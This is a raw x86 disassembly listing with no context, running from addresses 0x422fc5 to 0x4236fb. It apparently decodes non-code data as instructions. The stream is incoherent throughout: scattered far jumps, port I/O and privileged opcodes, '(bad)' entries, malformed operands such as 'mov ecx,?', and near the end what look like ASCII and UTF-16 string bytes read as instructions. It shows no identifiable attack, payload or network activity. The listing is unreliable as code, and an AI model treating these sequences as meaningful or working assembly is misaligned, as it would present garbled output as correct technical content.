  422fc5:	cmc    
  422fc6:	xchg   ecx,eax
  422fc7:	call   0xbee:0xed27eef4
  422fce:	dec    edx
  422fcf:	fld    QWORD PTR [ecx]
  422fd1:	add    BYTE PTR [ecx+0x0],ah
  422fd4:	add    BYTE PTR [eax],al
  422fd6:	xlat   BYTE PTR ds:[ebx]
  422fd7:	cli    
  422fd8:	mov    eax,0x312a67fe
  422fdd:	pusha  
  422fde:	lahf   
  422fdf:	jb     0x423011
  422fe1:	adc    ebp,ecx
  422fe3:	fwait
  422fe4:	mov    edx,DWORD PTR [edi+esi*4-0xbc6a572]
  422feb:	inc    edx
  422fec:	add    bl,BYTE PTR [ebp+0x21]
  422fef:	push   esi
  422ff0:	mov    edi,DWORD PTR [ebx]
  422ff2:	or     eax,0x2c41209e
  422ff7:	iret   
  422ff8:	sbb    BYTE PTR [edx+0x65],0x3c
  422ffc:	or     BYTE PTR [eax-0x3eee21f6],ah
  423002:	retf   
  423003:	adc    al,0x75
  423005:	cli    
  423006:	pop    ecx
  423007:	push   edx
  423008:	data16 adc dl,BYTE PTR [edi]
  42300b:	outs   dx,DWORD PTR ds:[esi]
  42300c:	adc    DWORD PTR [esi-0x2edb6498],ebp
  423012:	mov    edx,0x589d34be
  423017:	xchg   edi,eax
  423018:	mov    bh,BYTE PTR [ebp-0x520d8039]
  42301e:	shl    ebx,cl
  423020:	pop    esp
  423021:	pop    ecx
  423022:	pop    edx
  423023:	xlat   BYTE PTR ds:[ebx]
  423024:	dec    esp
  423025:	dec    esi
  423026:	push   ss
  423027:	stos   BYTE PTR es:[edi],al
  423028:	xor    ebp,DWORD PTR [esi+0x4e5d26ff]
  42302e:	dec    esp
  42302f:	hlt    
  423030:	inc    esi
  423031:	sti    
  423032:	iret   
  423033:	xchg   ebx,eax
  423034:	jl     0x422ffb
  423036:	cmp    al,0x0
  423038:	add    BYTE PTR [eax],al
  42303a:	add    BYTE PTR [eax],al
  42303c:	add    BYTE PTR [eax],al
  42303e:	push   ss
  42303f:	aad    0xdf
  423041:	out    dx,eax
  423042:	fucomip st,st(7)
  423044:	ss std 
  423046:	cmp    BYTE PTR [esi-0x2379a0c6],al
  42304c:	out    dx,al
  42304d:	je     0x422ffa
  42304f:	fld    QWORD PTR [ecx]
  423051:	add    BYTE PTR [ecx+0x0],ah
  423054:	add    BYTE PTR [eax],al
  423056:	push   ebx
  423057:	lahf   
  423058:	test   bl,ch
  42305a:	or     al,0x7
  42305c:	pop    es
  42305d:	outs   dx,DWORD PTR ds:[esi]
  42305e:	inc    ebx
  42305f:	pop    eax
  423060:	push   ebx
  423061:	je     0x42309c
  423063:	outs   dx,BYTE PTR ds:[esi]
  423064:	push   edi
  423065:	mov    BYTE PTR [ecx-0x5ea56071],bh
  42306b:	push   edx
  42306c:	stc    
  42306d:	jb     0x42304a
  42306f:	in     eax,dx
  423070:	stos   BYTE PTR es:[edi],al
  423071:	inc    ebx
  423072:	(bad)  
  423073:	mov    bh,0x35
  423075:	pop    eax
  423076:	js     0x423072
  423078:	cmp    eax,0x163c3981
  42307d:	leave  
  42307e:	out    dx,eax
  42307f:	xchg   ebx,eax
  423080:	push   0xbc91a72e
  423085:	pop    ds
  423086:	(bad)  
  423087:	frstor [ecx-0x58fcdb00]
  42308d:	sbb    BYTE PTR [ebp+0x16],dl
  423090:	sbb    BYTE PTR [ebx],bh
  423092:	mov    ebx,0xe715fcf3
  423097:	push   edi
  423098:	inc    ebp
  423099:	mov    edi,0x4872813
  42309e:	daa    
  42309f:	mov    ebp,0xd2a37e4d
  4230a4:	(bad)  
  4230a5:	out    0x97,eax
  4230a7:	xor    eax,0xeb4251f2
  4230ac:	fucomi st,st(0)
  4230ae:	mov    eax,ds:0x49977431
  4230b3:	in     al,0x94
  4230b5:	out    dx,al
  4230b6:	aas    
  4230b7:	add    BYTE PTR [eax],al
  4230b9:	add    BYTE PTR [eax],al
  4230bb:	add    BYTE PTR [eax],al
  4230bd:	add    BYTE PTR [esi+0x76],ch
  4230c0:	in     al,0xca
  4230c2:	cld    
  4230c3:	fisubr DWORD PTR [esi-0xa]
  4230c6:	sbb    BYTE PTR [edx+0x2d79787],dl
  4230cc:	ins    DWORD PTR es:[edi],dx
  4230cd:	or     DWORD PTR [esi+ebx*8],0x1
  4230d1:	add    BYTE PTR [ecx+0x0],ah
  4230d4:	add    BYTE PTR [eax],al
  4230d6:	inc    ebp
  4230d7:	sahf   
  4230d8:	clc    
  4230d9:	cmp    al,0x9b
  4230db:	or     BYTE PTR [edi],dh
  4230dd:	sar    dh,0x84
  4230e0:	fucom  st(3)
  4230e2:	in     al,dx
  4230e3:	xchg   esi,eax
  4230e4:	jnp    0x423115
  4230e6:	push   edi
  4230e7:	pushaw 
  4230e9:	js     0x42308f
  4230eb:	arpl   WORD PTR [ecx-0x61cb8007],di
  4230f1:	mov    al,ds:0xecebdd56
  4230f6:	sub    eax,0xf1377554
  4230fb:	fnsave [edx-0x3d]
  4230fe:	imul   eax,DWORD PTR [ebp+0x60],0xffffffb2
  423102:	ins    BYTE PTR es:[edi],dx
  423103:	(bad)  
  423104:	mov    ecx,0xad3f83b4
  423109:	fnstenv [eax+esi*4+0x251c8b7c]
  423110:	ret    
  423111:	sbb    BYTE PTR [ecx],bl
  423113:	mov    eax,0xe875f17f
  423118:	(bad)  
  423119:	lahf   
  42311a:	sbb    dh,BYTE PTR [eax-0x77024072]
  423120:	mov    ch,cl
  423122:	jne    0x423158
  423124:	in     al,0xd1
  423126:	iret   
  423127:	jle    0x423101
  423129:	stos   DWORD PTR es:[edi],eax
  42312a:	jo     0x423110
  42312c:	jle    0x423122
  42312e:	jmp    0x605dbd47
  423133:	mov    ds:0x5836a2,eax
  423138:	add    BYTE PTR [eax],al
  42313a:	add    BYTE PTR [eax],al
  42313c:	add    BYTE PTR [eax],al
  42313e:	cmp    dl,BYTE PTR [edx-0x3c]
  423141:	paddsb mm3,QWORD PTR [edi-0x2e098805]
  423148:	nop
  423149:	shl    DWORD PTR [ebx-0x41],cl
  42314c:	push   ds
  42314d:	(bad)  
  42314f:	fiadd  WORD PTR [ecx]
  423151:	add    BYTE PTR [ecx+0x0],ah
  423154:	add    BYTE PTR [eax],al
  423156:	mov    edx,0xef3355f3
  42315b:	or     al,0x88
  42315d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42315e:	test   al,0x95
  423160:	leave  
  423161:	dec    esi
  423162:	popa   
  423163:	lods   eax,DWORD PTR ds:[esi]
  423164:	in     eax,0x14
  423166:	jns    0x4231a2
  423168:	xor    esi,DWORD PTR [edx+ebp*4-0x28614359]
  42316f:	call   DWORD PTR [edi+0x2d91ae57]
  423175:	shl    BYTE PTR [edi-0x516dc60d],cl
  42317b:	inc    ebx
  42317c:	test   DWORD PTR [ecx-0x6e],ebx
  42317f:	das    
  423180:	add    dh,BYTE PTR [esi-0x753d9a16]
  423186:	scas   al,BYTE PTR es:[edi]
  423187:	cmp    dh,BYTE PTR [edx+edi*4]
  42318a:	retf   
  42318b:	or     dl,BYTE PTR [eax+0x38]
  42318e:	aaa    
  42318f:	retf   0xf080
  423192:	jns    0x42319c
  423194:	test   ch,al
  423196:	jbe    0x42317b
  423198:	ins    BYTE PTR es:[edi],dx
  423199:	loope  0x423169
  42319b:	or     ebx,edi
  42319d:	fisttp WORD PTR [esi]
  42319f:	mov    edi,0x8f57b773
  4231a4:	inc    ecx
  4231a5:	xchg   esi,eax
  4231a6:	push   edx
  4231a7:	(bad)  
  4231a8:	or     DWORD PTR [ecx*4-0x4507e4e7],esi
  4231af:	inc    ecx
  4231b0:	xchg   ebp,eax
  4231b1:	dec    ebx
  4231b2:	imul   DWORD PTR [esi+0x27d339]
  4231b8:	add    BYTE PTR [eax],al
  4231ba:	add    BYTE PTR [eax],al
  4231bc:	add    BYTE PTR [eax],al
  4231be:	xchg   ebx,eax
  4231bf:	cmp    DWORD PTR [ebp-0x2c814294],0xffffffff
  4231c6:	push   eax
  4231c7:	loopne 0x4231c3
  4231c9:	call   0xdece:0x2dd22ef
  4231d0:	add    DWORD PTR [eax],eax
  4231d2:	popa   
  4231d3:	add    BYTE PTR [eax],al
  4231d5:	add    BYTE PTR [edi],dh
  4231d7:	(bad)  
  4231d8:	pop    esp
  4231d9:	in     al,dx
  4231da:	fistp  QWORD PTR [eax-0x52]
  4231dd:	pop    ds
  4231de:	xor    eax,0xf18783f5
  4231e3:	sub    eax,0xf2045d80
  4231e8:	leave  
  4231e9:	mov    dl,0x5b
  4231eb:	int3   
  4231ec:	xchg   esp,eax
  4231ed:	(bad)  
  4231ee:	mov    ecx,0x75fb1dee
  4231f3:	mov    al,0xcb
  4231f5:	shr    DWORD PTR fs:[edi],1
  4231f8:	mov    eax,0xa8bf918
  4231fd:	xor    dh,BYTE PTR [edx]
  4231ff:	push   ds
  423200:	cmp    DWORD PTR [esi-0x414083eb],0x2c
  423207:	mov    esi,0x1d6e93ff
  42320c:	mov    ebp,0x71b23de8
  423211:	test   DWORD PTR [ebx],edx
  423213:	scas   eax,DWORD PTR es:[edi]
  423214:	retf   0xd088
  423217:	cmp    al,0x6c
  423219:	rol    DWORD PTR [edx],0x3
  42321c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42321d:	xchg   DWORD PTR [ebx-0x1d329a8d],esp
  423223:	jmp    DWORD PTR ds:0xe8786b73
  423229:	retf   0xd9f6
  42322c:	jne    0x4231d1
  42322e:	cdq    
  42322f:	clc    
  423230:	adc    DWORD PTR [edi-0x1561eb7a],edi
  423236:	imul   eax,DWORD PTR [eax],0x0
  42323c:	add    BYTE PTR [eax],al
  42323e:	(bad)  
  423240:	test   eax,0xddffeef7
  423246:	and    al,0x1
  423248:	pop    ebp
  423249:	dec    edi
  42324a:	xchg   esp,edx
  42324c:	push   cs
  42324d:	dec    ebp
  42324e:	das    
  42324f:	fild   WORD PTR [ecx]
  423251:	add    BYTE PTR [ecx+0x0],ah
  423254:	add    BYTE PTR [eax],al
  423256:	inc    esi
  423257:	cmp    DWORD PTR [esi],edi
  423259:	stos   DWORD PTR es:[edi],eax
  42325a:	iret   
  42325b:	shr    BYTE PTR [ebx+0x4c],1
  42325e:	cmp    BYTE PTR [ebp+0x7eb45d12],dh
  423264:	inc    esi
  423265:	dec    ebp
  423266:	xchg   ebx,eax
  423268:	xchg   ebp,eax
  423269:	dec    edi
  42326a:	xor    bl,dl
  42326c:	or     BYTE PTR [ecx+0x7333af61],dh
  423272:	ds popa 
  423274:	mov    cl,0xa6
  423276:	sub    al,0x27
  423278:	stos   DWORD PTR es:[edi],eax
  423279:	pop    edx
  42327a:	test   DWORD PTR [eax-0x24981aee],esp
  423280:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423281:	ss nop
  423283:	jbe    0x423216
  423285:	jb     0x423243
  423287:	adc    eax,0x1e11ddfc
  42328c:	xchg   edx,eax
  42328d:	(bad)  
  42328e:	push   ebx
  42328f:	scas   al,BYTE PTR es:[edi]
  423290:	xlat   BYTE PTR ds:[ebx]
  423291:	fild   WORD PTR [ecx+0x36]
  423294:	in     eax,0x24
  423296:	lods   al,BYTE PTR ds:[esi]
  423297:	pop    ds
  423298:	out    0x99,eax
  42329a:	es push 0x9c3d24ba
  4232a0:	stc    
  4232a1:	xchg   esp,eax
  4232a2:	and    eax,0x225c4b43
  4232a8:	mov    ecx,?
  4232aa:	pop    ds
  4232ab:	or     DWORD PTR [esi],0x8c1b9dcb
  4232b1:	imul   edi,DWORD PTR [ecx+0x3abf1a4],0x0
  4232bb:	add    BYTE PTR [eax],al
  4232bd:	add    BYTE PTR [edi-0x5e],ch
  4232c0:	aam    0x2a
  4232c2:	fnstsw WORD PTR [esi-0x1]
  4232c5:	out    0x52,eax
  4232c7:	fcmovu st,st(5)
  4232c9:	in     eax,0xd1
  4232cb:	cmp    dh,BYTE PTR [edi]
  4232cd:	jg     0x42325f
  4232cf:	fild   WORD PTR [ecx]
  4232d1:	add    BYTE PTR [ecx+0x0],ah
  4232d4:	add    BYTE PTR [eax],al
  4232d6:	loop   0x423266
  4232d8:	xor    BYTE PTR [esi+ebp*8+0x4b0bc038],0xf3
  4232e0:	rcr    dl,1
  4232e2:	dec    ebp
  4232e3:	in     eax,dx
  4232e4:	sbb    eax,0xed2968cc
  4232e9:	xchg   BYTE PTR [eax+0x625f23a9],ah
  4232ef:	out    0x55,eax
  4232f1:	inc    esi
  4232f2:	jb     0x4232df
  4232f4:	sub    eax,0xd19eec42
  4232f9:	or     ch,bl
  4232fb:	repz mov al,bh
  4232fe:	lahf   
  4232ff:	pop    ss
  423300:	imul   edi,eax,0xcbddf170
  423306:	sbb    BYTE PTR [eax],dh
  423308:	icebp  
  423309:	push   esp
  42330a:	out    0xaa,eax
  42330c:	cmp    bl,BYTE PTR [ebp-0x2edbc075]
  423312:	mov    edx,0xf56d92b5
  423317:	mov    eax,ds:0x586dd717
  42331c:	xchg   al,dl
  42331e:	shl    BYTE PTR [esp+ebx*8-0x66],cl
  423322:	sar    BYTE PTR [edi*4+0x7a314151],cl
  423329:	mov    dh,0x64
  42332b:	adc    ebx,DWORD PTR [ebx]
  42332d:	test   DWORD PTR [ecx+0x4b],ecx
  423330:	mov    dh,ah
  423332:	test   al,0x26
  423334:	xchg   esi,eax
  423335:	push   ebp
  423336:	fiadd  DWORD PTR [eax]
  423338:	add    BYTE PTR [eax],al
  42333a:	add    BYTE PTR [eax],al
  42333c:	add    BYTE PTR [eax],al
  42333e:	stc    
  42333f:	sbb    al,al
  423341:	inc    esi
  423342:	jecxz  0x423322
  423344:	(bad)  
  423345:	mov    edi,0xe1f1bc83
  42334a:	push   edx
  42334b:	mov    dl,0x90
  42334d:	jno    0x423340
  42334f:	fild   WORD PTR [ecx]
  423351:	add    BYTE PTR [ecx+0x0],ah
  423354:	add    BYTE PTR [eax],al
  423356:	pop    ebx
  423357:	push   esp
  423358:	xor    DWORD PTR [edx-0x2de85e79],ebx
  42335e:	adc    al,0x32
  423360:	fild   QWORD PTR [ebx-0x3e]
  423363:	inc    ecx
  423364:	arpl   WORD PTR [ecx-0x19c160bc],bx
  42336a:	(bad)  
  42336b:	gs pop ebp
  42336d:	xchg   BYTE PTR [edi+0x543f15f],dh
  423373:	add    DWORD PTR [esi+ebp*4+0x711e9d18],0x631b5ea
  42337e:	inc    ebx
  42337f:	fcmovnb st,st(0)
  423381:	inc    ecx
  423382:	test   DWORD PTR [ebx+0x3],0x22da2b4
  423389:	mov    esp,0x3642623a
  42338e:	and    DWORD PTR [ebp+0x2a5953fb],esp
  423394:	pushf  
  423395:	xlat   BYTE PTR ds:[ebx]
  423396:	mov    ecx,0x4cd9a2cd
  42339b:	jmp    0xc8cb:0xc27cb75d
  4233a2:	pop    ebp
  4233a3:	jmp    0xa8d9:0xa05a82a3
  4233aa:	fs enter 0xd3f4,0x77
  4233af:	pusha  
  4233b0:	pushf  
  4233b1:	ror    DWORD PTR [ebx-0x70fc524c],0x0
  4233b8:	add    BYTE PTR [eax],al
  4233ba:	add    BYTE PTR [eax],al
  4233bc:	add    BYTE PTR [eax],al
  4233be:	mov    eax,ds:0x3e8336b9
  4233c3:	(bad)  
  4233c4:	mov    ch,0xbb
  4233c6:	icebp  
  4233c7:	and    eax,0x54fa8c27
  4233cc:	jle    0x42336f
  4233ce:	push   edx
  4233cf:	loopne 0x4233d2
  4233d1:	add    BYTE PTR [ecx+0x0],ah
  4233d4:	add    BYTE PTR [eax],al
  4233d6:	dec    ebp
  4233d7:	nop
  4233d8:	jge    0x423394
  4233da:	scas   al,BYTE PTR es:[edi]
  4233db:	es inc esp
  4233dd:	jbe    0x4233df
  4233df:	popf   
  4233e0:	jmp    0xc309:0xdc87ef68
  4233e7:	inc    ebp
  4233e8:	out    0xb9,eax
  4233ea:	jmp    DWORD PTR [ebx+0x260f8eea]
  4233f0:	and    edi,DWORD PTR [edi+edx*8+0x142552a]
  4233f7:	xchg   edx,eax
  4233f8:	jo     0x4233cd
  4233fa:	mov    esi,0x41c5363a
  4233ff:	or     BYTE PTR [ebx],bh
  423401:	mov    eax,ds:0x77a599ed
  423406:	jle    0x423424
  423408:	outs   dx,BYTE PTR ds:[esi]
  423409:	fucomip st,st(7)
  42340b:	jmp    0x7bc3f375
  423410:	jns    0x42343c
  423412:	in     al,0x98
  423414:	mov    edi,0xc9635a8a
  423419:	cmp    eax,0xbd8bd77c
  42341e:	rol    edx,0xe1
  423421:	outs   dx,DWORD PTR ds:[esi]
  423422:	int    0xcd
  423424:	jne    0x423453
  423426:	sbb    al,0x3e
  423428:	mov    al,0x46
  42342a:	dec    cl
  42342c:	popa   
  42342d:	cs jecxz 0x42346f
  423430:	addr16 inc eax
  423432:	adc    BYTE PTR ds:0x65d123,0x0
  423439:	add    BYTE PTR [eax],al
  42343b:	add    BYTE PTR [eax],al
  42343d:	add    BYTE PTR [edx],dl
  42343f:	xlat   BYTE PTR ds:[ebx]
  423440:	repz or esi,edi
  423443:	das    
  423444:	cli    
  423445:	fist   WORD PTR [ecx]
  423447:	dec    ebx
  423448:	es nop
  42344a:	loop   0x423461
  42344c:	mov    WORD PTR [edx],?
  42344e:	mov    bl,0xe0
  423450:	add    DWORD PTR [eax],eax
  423452:	popa   
  423453:	add    BYTE PTR [eax],al
  423455:	add    BYTE PTR [esi-0x2d],dh
  423458:	xchg   BYTE PTR [eax+0xa],cl
  42345b:	popf   
  42345c:	push   esi
  42345d:	(bad)  
  42345e:	fsubr  st(3),st
  423460:	mov    DWORD PTR [esi+0x6a8be9e2],ecx
  423466:	jmp    0xd3a0:0xc7862dea
  42346d:	outs   dx,BYTE PTR ds:[esi]
  42346e:	fst    DWORD PTR [edi-0x1a]
  423471:	ss mov esi,0x63c408c2
  423477:	jnp    0x42341a
  423479:	sub    DWORD PTR [eax+esi*1],ebx
  42347c:	retf   0x8c12
  42347f:	int3   
  423480:	mov    ch,BYTE PTR [esi+0x6f]
  423483:	mov    eax,ds:0xed39d44
  423488:	push   edi
  423489:	xor    al,0xa1
  42348b:	repz sub ecx,DWORD PTR [ebp+0x52fb3344]
  423492:	xor    DWORD PTR [edx+0x59],ecx
  423495:	retf   
  423496:	(bad)
  42349b:	pop    eax
  42349c:	mov    esp,gs
  42349e:	mov    ds:0xd895c563,al
  4234a3:	loope  0x4234f2
  4234a5:	cwde   
  4234a6:	dec    edx
  4234a7:	scas   eax,DWORD PTR es:[edi]
  4234a8:	fidivr DWORD PTR [eax+0x5c]
  4234ab:	dec    esi
  4234ac:	js     0x4234eb
  4234ae:	les    ecx,FWORD PTR [eax+0x53]
  4234b1:	fisub  WORD PTR [ebx]
  4234b3:	pop    edi
  4234b4:	ja     0x4234cf
  4234b6:	jecxz  0x4234b8
  4234b8:	add    BYTE PTR [eax],al
  4234ba:	add    BYTE PTR [eax],al
  4234bc:	add    BYTE PTR [eax],al
  4234be:	add    al,al
  4234c0:	inc    edx
  4234c1:	add    BYTE PTR [eax+eax*8],al
  4234c4:	inc    edx
  4234c5:	add    BYTE PTR [eax],cl
  4234c7:	rol    BYTE PTR [edx+0x0],0xc
  4234cb:	rol    BYTE PTR [edx+0x0],0x10
  4234cf:	rol    BYTE PTR [edx+0x0],0x14
  4234d3:	rol    BYTE PTR [edx+0x0],0x18
  4234d7:	rol    BYTE PTR [edx+0x0],0x1c
  4234db:	rol    BYTE PTR [edx+0x0],0x57
  4234df:	inc    edi
  4234e0:	cmp    DWORD PTR [edi+0x41],ebx
  4234e3:	pop    eax
  4234e4:	ss push esi
  4234e6:	pop    edi
  4234e7:	cmp    BYTE PTR [eax],al
  4234e9:	inc    ebx
  4234ea:	inc    ebp
  4234eb:	dec    esp
  4234ec:	pop    edi
  4234ed:	pop    eax
  4234ee:	push   edi
  4234ef:	dec    eax
  4234f0:	inc    edx
  4234f1:	add    BYTE PTR [edi+0x50],dl
  4234f4:	xor    eax,0x4641365f
  4234f9:	cmp    DWORD PTR [edx],esi
  4234fb:	xor    ebx,DWORD PTR [edi+0x32]
  4234fe:	aaa    
  4234ff:	add    BYTE PTR [eax+0x48],dl
  423502:	xor    BYTE PTR [edi+0x58],bl
  423505:	push   esp
  423506:	inc    ecx
  423507:	dec    ebp
  423508:	push   ecx
  423509:	pop    edi
  42350a:	inc    esi
  42350b:	push   ebp
  42350c:	cmp    DWORD PTR [eax],eax
  42350e:	push   edi
  42350f:	push   ebp
  423510:	inc    ecx
  423511:	xor    dh,BYTE PTR [ebx]
  423513:	xor    ebx,DWORD PTR [edi+0x4e]
  423516:	add    BYTE PTR [esp+ecx*2+0x4d],dl
  42351a:	cmp    DWORD PTR [edi+0x38],ebx
  42351d:	dec    ecx
  42351e:	cmp    DWORD PTR [edx+0x36],ebx
  423521:	pop    edi
  423522:	dec    edx
  423523:	xor    BYTE PTR [edx+0x34],cl
  423526:	add    BYTE PTR [ecx+eax*2+0x34],cl
  42352a:	xor    esi,DWORD PTR [eax]
  42352c:	pop    edi
  42352d:	inc    edx
  42352e:	dec    ebx
  42352f:	pop    eax
  423530:	pop    eax
  423531:	xor    eax,0x51414d00
  423536:	pop    edi
  423537:	inc    ecx
  423538:	xor    al,BYTE PTR [ebp+0x5f]
  42353b:	inc    ecx
  42353c:	dec    ebx
  42353d:	cmp    DWORD PTR ds:0x5a003939,esi
  423543:	inc    ebp
  423544:	cmp    BYTE PTR [edi+0x4d],bl
  423547:	ss dec eax
  423549:	dec    ebx
  42354a:	add    BYTE PTR [ebp+0x57],al
  42354d:	xor    DWORD PTR [edi+0x31],ebx
  423550:	dec    ebx
  423551:	xor    eax,DWORD PTR [ecx+0x30]
  423554:	push   ebx
  423555:	add    BYTE PTR [edx+esi*1+0x36],al
  423559:	aaa    
  42355a:	pop    edi
  42355b:	push   edx
  42355c:	dec    eax
  42355d:	dec    ebp
  42355e:	cmp    BYTE PTR [edi+0x37],bl
  423561:	inc    esi
  423562:	xor    eax,0x43355500
  423567:	pop    edi
  423568:	pop    ecx
  423569:	dec    ecx
  42356a:	push   ebx
  42356b:	xor    bl,BYTE PTR [edi+0x52]
  42356e:	add    BYTE PTR [eax+0x55],dl
  423571:	dec    ecx
  423572:	xor    BYTE PTR [edi+0x43],bl
  423575:	ss inc ebp
  423577:	xor    bl,BYTE PTR [edi+0x4d]
  42357a:	xor    al,0x4a
  42357c:	push   edx
  42357d:	push   ebp
  42357e:	add    BYTE PTR [esi+0x39],cl
  423581:	push   eax
  423582:	pop    edi
  423583:	push   ebp
  423584:	cmp    DWORD PTR [esi],esi
  423586:	xor    BYTE PTR [ecx],dh
  423588:	pop    edi
  423589:	dec    edi
  42358a:	dec    esi
  42358b:	push   esp
  42358c:	cmp    BYTE PTR [eax],al
  42358e:	dec    esp
  42358f:	xor    al,0x44
  423591:	xor    DWORD PTR [edi+0x4b],ebx
  423594:	xor    DWORD PTR [ebp+0x5f],eax
  423597:	pop    edx
  423598:	add    BYTE PTR [edi+esi*1+0x43],dl
  42359c:	pop    edi
  42359d:	inc    edx
  42359e:	xor    dh,BYTE PTR [ecx]
  4235a0:	push   ebx
  4235a1:	xor    DWORD PTR [ecx],edi
  4235a3:	inc    edx
  4235a4:	add    BYTE PTR [edi+0x45],al
  4235a7:	xor    al,0x38
  4235a9:	xor    BYTE PTR [eax],dh
  4235ab:	pop    edi
  4235ac:	dec    edx
  4235ad:	dec    ebx
  4235ae:	xor    eax,0x33345f4d
  4235b3:	add    BYTE PTR [ebx+esi*1+0x57],cl
  4235b7:	pop    edi
  4235b8:	aaa    
  4235b9:	push   esi
  4235ba:	dec    ebx
  4235bb:	push   edx
  4235bc:	pop    edi
  4235bd:	inc    ebx
  4235be:	add    BYTE PTR [edx+0x35],bl
  4235c1:	dec    ebp
  4235c2:	pop    edi
  4235c3:	inc    edi
  4235c4:	dec    esi
  4235c5:	xor    al,0x49
  4235c7:	xor    eax,0x54590035
  4235cc:	push   edx
  4235cd:	pop    edi
  4235ce:	push   esp
  4235cf:	inc    ebx
  4235d0:	inc    ecx
  4235d1:	pop    edi
  4235d2:	cmp    DWORD PTR [ecx+0x41],ebx
  4235d5:	push   ebp
  4235d6:	pop    edi
  4235d7:	push   ebp
  4235d8:	inc    ebp
  4235d9:	add    BYTE PTR [esi+esi*1+0x35],cl
  4235dd:	pop    edi
  4235de:	pop    eax
  4235df:	dec    edx
  4235e0:	inc    edx
  4235e1:	inc    edi
  4235e2:	add    BYTE PTR [edx+0x36],al
  4235e5:	inc    ebx
  4235e6:	pop    edi
  4235e7:	xor    BYTE PTR ds:0x36464b,dh
  4235ed:	dec    ebx
  4235ee:	cmp    DWORD PTR [esi+0x37],eax
  4235f1:	xor    ebx,DWORD PTR [edi+0x35]
  4235f4:	ss inc edi
  4235f6:	pop    ecx
  4235f7:	dec    eax
  4235f8:	pop    ecx
  4235f9:	add    BYTE PTR [ebp+0x35],cl
  4235fc:	push   eax
  4235fd:	xor    BYTE PTR [edi+0x4f],bl
  423600:	pop    ecx
  423601:	xor    cl,BYTE PTR [edi+0x0]
  423604:	pop    ecx
  423605:	xor    DWORD PTR [esi+0x5f],ecx
  423608:	xor    al,BYTE PTR [edx+0x30]
  42360b:	push   esi
  42360c:	push   esp
  42360d:	inc    ebp
  42360e:	add    BYTE PTR [edi+0x37],al
  423611:	push   esi
  423612:	xor    DWORD PTR [edi+0x49],ebx
  423615:	xor    al,BYTE PTR [esi+0x30]
  423618:	pop    edi
  423619:	ss dec esi
  42361b:	cmp    BYTE PTR [eax],al
  42361d:	pop    edx
  42361e:	xor    eax,0x445f334b
  423623:	xor    BYTE PTR [eax],bh
  423625:	push   ecx
  423626:	push   esi
  423627:	xor    al,0x0
  423629:	push   ebp
  42362a:	pop    eax
  42362b:	inc    edi
  42362c:	xor    DWORD PTR [edi+0x39],ebx
  42362f:	push   esp
  423630:	inc    ebx
  423631:	aaa    
  423632:	inc    esp
  423633:	add    BYTE PTR [edi+0x39],dl
  423636:	ss pop edi
  423638:	dec    eax
  423639:	pop    edx
  42363a:	pop    ecx
  42363b:	inc    edi
  42363c:	push   ebp
  42363d:	pop    edi
  42363e:	push   eax
  42363f:	dec    eax
  423640:	inc    ebx
  423641:	add    BYTE PTR [ebp+0x0],dl
  423644:	xor    al,0x0
  423646:	dec    edi
  423647:	add    BYTE PTR [edi+0x0],bl
  42364a:	cmp    BYTE PTR [eax],al
  42364c:	xor    al,BYTE PTR [eax]
  42364e:	inc    ebx
  42364f:	add    BYTE PTR [edx+0x0],bl
  423652:	inc    ebx
  423653:	add    BYTE PTR [edi],dh
  423655:	add    BYTE PTR [edi+0x0],bl
  423658:	inc    ebx
  423659:	add    BYTE PTR [eax+eax*1+0x0],al
  42365d:	add    BYTE PTR [eax+eax*1+0x4b],cl
  423661:	add    BYTE PTR [edx],dh
  423663:	add    BYTE PTR [edi+0x0],bl
  423666:	cmp    BYTE PTR [eax],al
  423668:	dec    esp
  423669:	add    BYTE PTR [esi+0x0],dl
  42366c:	pop    edi
  42366d:	add    BYTE PTR [ecx+0x0],bl
  423670:	push   edx
  423671:	add    BYTE PTR [esi+0x0],dl
  423674:	xor    al,BYTE PTR [eax]
  423676:	cmp    BYTE PTR [eax],al
  423678:	pop    edi
  423679:	add    BYTE PTR [edx+0x0],cl
  42367c:	add    BYTE PTR [eax],al
  42367e:	inc    edx
  42367f:	add    BYTE PTR [eax+eax*1+0x46],cl
  423683:	add    BYTE PTR [edi+0x0],bl
  423686:	xor    eax,DWORD PTR [eax]
  423688:	inc    ebp
  423689:	add    BYTE PTR [ecx+0x0],cl
  42368c:	push   edx
  42368d:	add    BYTE PTR [ecx],bh
  42368f:	add    BYTE PTR [esi+0x0],dl
  423692:	add    BYTE PTR [eax],al
  423694:	dec    ebp
  423695:	add    BYTE PTR [edi],dh
  423697:	add    BYTE PTR [eax+eax*1+0x5f],al
  42369b:	add    BYTE PTR [edx+0x0],cl
  42369e:	pop    eax
  42369f:	add    BYTE PTR [ebx],dh
  4236a1:	add    BYTE PTR [ecx],dh
  4236a3:	add    BYTE PTR [ebx+0x0],al
  4236a6:	add    BYTE PTR [eax],al
  4236a8:	dec    edi
  4236a9:	add    BYTE PTR [esi],dh
  4236ab:	add    BYTE PTR [eax+0x0],cl
  4236ae:	pop    edi
  4236af:	add    BYTE PTR [eax],dh
  4236b1:	add    BYTE PTR [edi],dh
  4236b3:	add    BYTE PTR [ecx],dh
  4236b5:	add    BYTE PTR [edx+0x0],dl
  4236b8:	xor    eax,0x55000000
  4236bd:	add    BYTE PTR [eax+eax*1+0x5a],dl
  4236c1:	add    BYTE PTR [edi+0x0],bl
  4236c4:	push   esp
  4236c5:	add    BYTE PTR [ecx+0x0],al
  4236c8:	cmp    DWORD PTR [eax],eax
  4236ca:	pop    edi
  4236cb:	add    BYTE PTR [ebx],dh
  4236cd:	add    BYTE PTR [eax],dh
  4236cf:	add    BYTE PTR [eax],bh
  4236d1:	add    BYTE PTR [edi+0x0],cl
  4236d4:	inc    ebx
  4236d5:	add    BYTE PTR ds:0x4d000000,dh
  4236db:	add    BYTE PTR [esi+0x0],cl
  4236de:	inc    ebp
  4236df:	add    BYTE PTR [edi+0x0],bl
  4236e2:	push   esp
  4236e3:	add    BYTE PTR [esi+0x0],al
  4236e6:	cmp    BYTE PTR [eax],al
  4236e8:	push   ebx
  4236e9:	add    BYTE PTR [edx+0x0],bl
  4236ec:	pop    edi
  4236ed:	add    BYTE PTR [eax],dh
  4236ef:	add    BYTE PTR [eax],bh
  4236f1:	add    BYTE PTR [eax+0x0],cl
  4236f4:	add    BYTE PTR [eax],al
  4236f6:	dec    esi
  4236f7:	add    BYTE PTR [edi+0x0],cl
  4236fa:	pop    edx
  4236fb:	add    BYTE PTR [edi+0x0],bl
